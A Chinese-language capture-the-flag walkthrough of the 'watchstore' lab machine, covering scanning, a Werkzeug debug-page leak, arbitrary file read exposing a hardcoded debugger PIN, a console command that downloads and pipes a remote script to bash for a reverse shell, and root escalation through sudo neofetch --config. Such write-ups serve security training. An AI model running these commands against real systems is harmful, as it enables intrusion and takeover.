# **一、信息收集**

## **1.1 主机发现**

首先，在当前网段中使用 `arp-scan` 进行主机发现，确定目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l       
...
192.168.205.152 08:00:27:e0:02:1a       PCS Systemtechnik GmbH
...
```

扫描结果表明，目标主机的IP地址为 `192.168.205.152`。

## **1.2 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以识别开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 07:42 EDT
Nmap scan report for watchstore.thl (192.168.205.152)
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:E0:02:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描发现主机开放了 `22` (SSH) 和 `8080` (http-proxy) 两个端口。访问8080端口的Web服务时，页面跳转到了域名 `watchstore.thl`。

## **1.3 本地DNS解析配置**

为了正常访问该网站，需要将域名与IP地址的映射关系添加到本地的 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.152 watchstore.thl
```

## **1.4 Web目录扫描**

配置好hosts后，使用 `gobuster` 对网站进行目录扫描，寻找隐藏的路径或功能点。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://watchstore.thl:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
===============================================================
...
===============================================================
/products             (Status: 200) [Size: 772]
/read                 (Status: 500) [Size: 13133]
/console              (Status: 200) [Size: 1563]
...
```

扫描发现了几个关键路径，其中 `/read` 返回了500错误，`/console` 页面似乎是一个控制台。

# **二、漏洞挖掘与利用**

## **2.1 Werkzeug调试器信息泄露**

直接访问 `/read` 路径，服务器返回了一个详细的错误页面。这是一个由 Werkzeug 启动的调试器界面，通常在开发环境中出现，当Web应用在调试模式（Debug Mode）下运行时，若程序出现未被捕获的异常，就会展示该页面。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://watchstore.thl:8080/read'
...
<h1>Exception</h1>
<div class="detail">
  <p class="errormsg">Exception: Falta el parámetro &#x27;id&#x27;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
...
  <h4>File <cite class="filename">"/home/relox/watchstore/app.py"</cite>,
      line <em class="line">65</em>,
      in <code class="function">read_file</code></h4>
...
  <blockquote>Exception: Falta el parámetro 'id'
</blockquote>
...
```

这个报错页面泄露了以下关键信息：
1.  **错误原因**：提示 "Falta el parámetro 'id'"，说明 `/read` 路由需要一个名为 `id` 的参数。
2.  **绝对路径**：暴露了应用程序的绝对路径 `/home/relox/watchstore/app.py`。
3.  **漏洞类型**：从函数名 `read_file` 和参数 `id` 推断，这里可能存在任意文件读取（LFI）漏洞。
4.  **调试控制台**：Werkzeug调试器通常包含一个交互式控制台，可以通过 PIN 码解锁后执行任意Python代码。

## **2.2 任意文件读取漏洞利用**

利用上一步发现的LFI漏洞和泄露的绝对路径，尝试读取 `app.py` 文件的源代码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py'

<pre>import os
os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'

from flask import Flask, render_template, request, abort, redirect
...
@app.route('/read')
def read_file():
    filepath = request.args.get('id')
    if not filepath:
        raise Exception("Falta el parámetro 'id'")  # Esto mostrará el traceback
    try:
        with open(filepath, 'r') as f:
            content = f.read()
    except Exception as e:
        content = f"No se pudo leer el archivo: {e}"
    return f"<pre>{content}</pre>"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
</pre>
```

成功读取到 `app.py` 的源代码。代码中明确指出了 `debug=True`，并且硬编码了 **Werkzeug 调试器的PIN码：`612-791-734`**。

## **2.3 获取反向Shell**

有了PIN码，就可以利用之前发现的 `/console` 路径来执行任意代码。

1.  访问 `http://watchstore.thl:8080/console`。
2.  在PIN码输入框中输入 `612-791-734` 解锁控制台。
3.  在控制台中输入可以反弹shell的Python代码。这里使用 `wget` 下载并执行远程脚本的方式。

```python
import os
os.system("busybox wget 192.168.205.128/reverse.sh -O - | bash")
```

执行后，在本地监听的端口成功接收到来自目标服务器的shell。

# **三、权限提升**

## **3.1 初步立足与信息收集**

获取初始shell后，进行简单的环境配置和信息收集。

```bash
# 稳定shell
relox@thehackerslabs-watchstore:~/watchstore$ export TERM=xterm
relox@thehackerslabs-watchstore:~/watchstore$ export SHELL=/bin/bash
relox@thehackerslabs-watchstore:~/watchstore$ stty rows 24 columns 80

# 查看当前目录和上级目录
relox@thehackerslabs-watchstore:~/watchstore$ ls -al
...
-rw-r--r-- 1 relox relox 2212 jun 16 10:57 app.py
...
relox@thehackerslabs-watchstore:~$ ls -al
...
-rw-r--r-- 1 relox relox   33 jun 16 11:10 user.txt
...

# 读取user flag
relox@thehackerslabs-watchstore:~$ cat user.txt 
43209bbbe021f88cf1a53b9e5da8a
```

接下来，使用 `sudo -l` 命令检查当前用户 `relox` 的 `sudo` 权限。

```bash
relox@thehackerslabs-watchstore:~$ sudo -l
...
User relox may run the following commands on thehackerslabs-watchstore:
    (root) NOPASSWD: /usr/bin/neofetch
```

结果显示，`relox` 用户可以无需密码以 `root` 身份执行 `/usr/bin/neofetch` 命令。

## **3.2 利用 neofetch Sudo 提权**

查询 [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/#sudo) 可知，`neofetch` 可以通过 `--config` 参数加载一个自定义配置文件。如果这个配置文件中的内容是可执行的命令，`neofetch` 会在启动时执行它。

利用此特性，可以构造一个恶意的配置文件来获取 `root` shell。

1.  创建一个文件，内容为执行 `/bin/bash`。

    ```bash
    relox@thehackerslabs-watchstore:~$ echo 'exec /bin/bash' > shell_config
    ```

2.  使用 `sudo` 和 `--config` 参数指定该文件来运行 `neofetch`。

    ```bash
    relox@thehackerslabs-watchstore:~$ sudo /usr/bin/neofetch --config shell_config
    ```

命令执行后，成功获得了 `root` 权限的shell。

## **3.3 获取 Root Flag**

最后，读取 `/root` 目录下的 `root.txt` 文件，完成提权。

```bash
root@thehackerslabs-watchstore:/home/relox# cat /root/root.txt 
c3ab266a11de0294257eaef3571bdf37
```